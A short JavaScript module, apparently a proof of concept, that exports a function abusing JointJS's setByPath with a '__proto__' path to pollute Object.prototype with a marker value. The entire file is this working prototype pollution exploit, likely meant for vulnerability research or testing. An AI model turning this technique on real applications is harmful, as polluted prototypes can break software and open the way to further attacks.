function exploitFunction(payload) {
    // Ensure jointjs is imported here
    const jointjs = require("jointjs");
    jointjs.util.setByPath(payload, "__proto__/polluted", "yes", "/");
}

module.exports = { exploitFunction };